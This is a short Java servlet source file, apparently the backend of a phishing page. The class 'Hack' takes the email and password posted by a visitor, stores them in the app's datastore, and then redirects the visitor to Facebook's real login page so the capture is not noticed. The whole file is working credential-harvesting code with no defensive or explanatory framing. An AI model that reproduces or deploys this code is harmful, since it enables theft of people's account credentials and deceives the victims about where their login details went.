package pkg;

import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import static pkg.OfyService.ofy;

public class Hack extends HttpServlet {
	@Override
	protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
		// TODO Auto-generated method stub
		String email = req.getParameter("email");
		String password = req.getParameter("password");
		
		RegisterEntity re = new RegisterEntity(email, password);
		ofy().save().entities(re);
		ofy().clear();
		
		resp.sendRedirect("https://www.facebook.com/login/");
	}
}
